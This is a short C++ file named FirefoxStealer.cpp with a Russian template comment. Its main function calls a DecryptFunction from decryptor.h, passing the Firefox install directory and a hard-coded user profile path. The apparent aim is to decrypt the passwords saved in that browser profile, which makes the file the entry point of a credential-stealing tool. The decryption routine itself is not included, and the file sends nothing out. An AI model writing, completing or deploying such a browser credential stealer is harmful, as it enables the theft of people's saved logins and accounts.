// FirefoxStealer.cpp : Этот файл содержит функцию "main". Здесь начинается и заканчивается выполнение программы.
//

#include <iostream>
#include "decryptor.h"

int main()
{
	setlocale(LC_ALL, "Russian");
	
	DecryptFunction((char*)"C:\\Program Files\\Mozilla Firefox", "C:\\Users\\Даша\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\gbrf993m.default-release");
	
	//DecryptFunction((char*)"C:\\Program Files\\Mozilla Firefox", "C:/Users/Даша/AppData/Roaming/Mozilla/Firefox/Profiles/gbrf993m.default-release");
}


